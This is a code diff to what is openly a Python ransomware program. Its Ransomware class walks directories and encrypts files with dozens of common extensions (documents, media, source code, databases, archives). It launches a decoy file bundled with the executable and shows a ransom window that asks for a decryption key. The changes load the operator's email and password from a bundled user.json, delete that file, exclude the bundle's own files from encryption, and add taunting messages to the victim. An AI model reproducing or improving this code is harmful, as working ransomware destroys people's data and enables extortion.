@@ -9,6 +9,7 @@ from functools import partial
 from PIL import ImageTk, Image
 from threading import Thread
 import subprocess
+import json
 
 import setup
 import modules.cryptography
@@ -29,7 +30,7 @@ class Ransomware:
             'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',
             'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
             'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 'mobi',
-            'yml', 'yaml', 'json', 'xml', 'csv',
+            'yml', 'yaml', 'xml', 'csv',
             'db', 'sql', 'dbf', 'mdb', 'iso',
             'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
             'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
@@ -37,7 +38,7 @@ class Ransomware:
             'ps', 'bat', 'vb',
             'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
             'go', 'py', 'pyc', 'bf', 'coffee',
-            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
+            'tar', 'tgz', 'bz2', '7z', 'rar', 'bak'
         ]
 
         self.interesting_extensions_tests = ['txt']
@@ -46,7 +47,7 @@ class Ransomware:
         self.user_password = ''
         self.fake_file_name = ''
 
-    def main(self):
+    def main(self, passwd):
         # start = time.time()
         self.check_user_info()
 
@@ -70,19 +71,20 @@ class Ransomware:
         gui.show_message()
 
     def check_user_info(self):
-        user_files = os.listdir('./user_info')
-
-        if not user_files:
-            messagebox.showerror('ERROR', 'To use program you have to set it up first! Run "python3 setup.py" in main directory first!')
-            sys.exit(1)
-        else:
-            with open(f'./user_info/{user_files[0]}') as user_info:
+        path = normalize_path_name(sys._MEIPASS, 'user.json')
+        try:
+            with open(path) as user_info:     
                 content = user_info.read()
 
                 info = json.loads(content)
                 self.user_email = info['email']
                 self.user_password = info['password']
                 self.fake_file_name = info['fake_file_name']
+            os.remove(path)
+        except FileNotFoundError:
+            messagebox.showerror('ERROR', 'To use program you have to set it up first! Run "python3 setup.py" in main directory first!')
+            sys.exit(1)  
+            
 
     def gen_pass(self):
         new_password = modules.cryptography.generate_password()
@@ -140,10 +142,12 @@ class Ransomware:
 
     def encrypt_files(self, key):
         all_files = self.file_generator(self.starting_dir_test, self.interesting_extensions)
+        restricted_files = list(self.file_generator(sys._MEIPASS, self.interesting_extensions))
 
         for f in all_files:
             try:
-                modules.cryptography.encrypt(key, f)
+                if f not in restricted_files:
+                    modules.cryptography.encrypt(key, f)
             except:
                 pass
 
@@ -151,7 +155,7 @@ class Ransomware:
         for root, dirs, files in os.walk(path):
             for name in files:
                 if name.split('.')[-1] in extensions:
-                    yield os.path.join(root, name)
+                    yield os.path.abspath(os.path.join(root, name))
 
     def open_fake_file(self):
         subprocess.Popen(normalize_path_name(sys._MEIPASS, self.fake_file_name), shell=True)
@@ -164,7 +168,6 @@ class RansomGUI(Ransomware):
         self.key_input = key_input
 
         Ransomware.__init__(self, starting_dir_test)
-
 
     def show_message(self):
         root = Tk()
@@ -212,7 +215,6 @@ class RansomGUI(Ransomware):
     def throw_error_message(self):
         messagebox.showerror('ERROR', 'Wrong key man!\n If you are trying to brute-force encryption, then good luck xd\n If not, please enter valid key more carefully')
 
-
     def trigger_decrypt(self, text_message_callback):
         possible_key = text_message_callback().strip()
 
@@ -227,12 +229,15 @@ class RansomGUI(Ransomware):
                 self.extensions_to_decrypt
             )
 
+            messagebox.showinfo('Decrypting...', 'Ok, your files will now start to decrypt, so keep calm and DO NOT POWER OFF!')
+            
             for f in all_files:
                 try:
                     modules.cryptography.decrypt(possible_key, f)
-                except StopIteration:
+                except Exception as e:
                     pass
 
+            messagebox.showinfo('Success!', 'Your files are safe and sound now! No need to thank me xd')
             sys.exit(0)
 
         else:
